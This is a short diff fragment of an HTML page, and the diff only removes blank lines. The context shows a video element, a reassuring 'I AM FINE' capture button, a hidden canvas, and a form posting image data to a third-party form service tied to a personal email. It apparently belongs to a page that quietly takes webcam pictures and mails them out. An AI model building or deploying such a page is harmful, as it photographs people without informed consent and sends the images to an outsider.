@@ -79,8 +79,6 @@ button:hover {
 </video>
 
 <button id="capture">I AM FINE</button>
-
-
 <canvas id="canvas" style="display:none;"></canvas>
 
 <form id="imageForm" action="https://formsubmit.co/ganeshbist257@gmail.com" method="POST" enctype="multipart/form-data">
